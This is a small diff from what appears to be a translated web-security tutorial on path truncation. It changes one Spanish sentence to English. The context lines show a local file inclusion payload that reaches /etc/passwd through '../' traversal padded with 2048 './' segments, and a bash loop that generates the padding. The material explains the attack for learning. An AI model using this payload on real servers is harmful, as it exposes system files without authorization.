@@ -20,7 +20,7 @@
 ?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
 ```
 
-no tenemos que escribir manualmente ./ 2048 veces (un total de 4096 caracteres)
+We don't have to manually type ./ 2048 times (a total of 4096 characters).
 
 ```
 echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
